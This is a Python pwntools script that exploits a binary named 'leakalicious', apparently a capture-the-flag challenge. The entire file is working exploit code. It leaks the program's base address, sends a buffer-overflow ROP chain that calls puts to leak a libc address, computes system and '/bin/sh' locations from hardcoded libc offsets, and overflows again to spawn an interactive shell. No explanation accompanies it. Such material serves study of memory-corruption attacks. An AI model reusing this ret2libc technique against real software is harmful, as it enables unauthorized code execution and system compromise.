from pwn import *

buffer_size = 36

elf = ELF('./leakalicious')
app = process('./leakalicious')

app.sendlineafter("> ", "aaaa")

base_offset = u32(app.recvuntil("?")[-9:-5]) - 0x12ab

puts_plt_address = base_offset + elf.plt['puts']
printf_got_address = base_offset + elf.got['printf']
main_address = base_offset + elf.symbols['main']
got_plt_address = base_offset + 0x4000

padding = 'a' * buffer_size + p32(got_plt_address) + 'aaaa'
leak_libc_addr_payload = padding + p32(puts_plt_address) + p32(main_address) + p32(printf_got_address) 

app.sendlineafter("> ", "aaaa")
app.sendlineafter("> ", leak_libc_addr_payload)

libc_addresses = app.recv()[:12]
libc_addresses = [u32(libc_addresses[i:i+4]) for i in range(0, len(libc_addresses), 4)]

print(map(hex, libc_addresses))

# Use blukat.me to lookup and download correct version of libc based on libc offsets 

#libc = ELF('libc.so.6')
#printf_libc_offset = libc.symbols['printf']
#system_libc_offset = libc.symbols['system']
#bin_sh_libc_offset = libc.search("/bin/sh").next()

printf_libc_offset = 0x0503e0
system_libc_offset = 0x0423d0
bin_sh_libc_offset = 0x17ff68

libc_base_offset = libc_addresses[0] - printf_libc_offset
libc_system_addr = libc_base_offset + system_libc_offset
libc_bin_sh_addr = libc_base_offset + bin_sh_libc_offset

app.sendline("aaaa")
app.sendlineafter("> ", "aaaa")

gain_shell_payload = padding + p32(libc_system_addr) + "xxxx" + p32(libc_bin_sh_addr)

app.sendlineafter("> ", gain_shell_payload)

app.interactive()